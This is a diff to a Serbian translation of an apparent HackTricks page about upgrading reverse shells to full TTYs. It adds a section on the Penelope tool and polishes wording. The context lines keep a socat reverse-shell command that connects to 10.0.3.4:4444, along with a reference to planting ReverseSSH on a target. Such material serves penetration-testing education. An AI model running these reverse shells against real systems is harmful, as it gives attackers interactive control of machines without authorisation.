@@ -67,7 +67,7 @@ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
 
 ## ReverseSSH
 
-Pogodan način za **interaktivni pristup ljusci**, kao i **prenos fajlova** i **prosleđivanje portova**, je postavljanje statički povezanog ssh servera [ReverseSSH](https://github.com/Fahrj/reverse-ssh) na cilj.
+Praktičan način za **interaktivni pristup ljusci**, kao i **prenos fajlova** i **prosleđivanje portova**, je postavljanje statički povezanog ssh servera [ReverseSSH](https://github.com/Fahrj/reverse-ssh) na cilj.
 
 Ispod je primer za `x86` sa upx-kompresovanim binarnim datotekama. Za druge binarne datoteke, proverite [releases page](https://github.com/Fahrj/reverse-ssh/releases/latest/).
 
@@ -112,6 +112,12 @@ ssh -p 8888 127.0.0.1
 # Bidirectional file transfer
 sftp -P 8888 127.0.0.1
 ```
+## Penelope
+
+Penelope (https://github.com/brightio/penelope) automatski unapređuje Linux reverse shells u TTY, upravlja veličinom terminala, beleži sve i još mnogo toga. Takođe pruža readline podršku za Windows shell-ove.
+
+![penelope](https://github.com/user-attachments/assets/27ab4b3a-780c-4c07-a855-fd80a194c01e)
+
 ## No TTY
 
 Ako iz nekog razloga ne možete dobiti pun TTY, **i dalje možete interagovati sa programima** koji očekuju korisnički unos. U sledećem primeru, lozinka se prosleđuje `sudo` da bi se pročitala datoteka:
@@ -128,7 +134,7 @@ Učite i vežbajte GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data
 
 * Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
 * **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Podelite hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.
+* **Podelite hakerske trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.
 
 </details>
 {% endhint %}
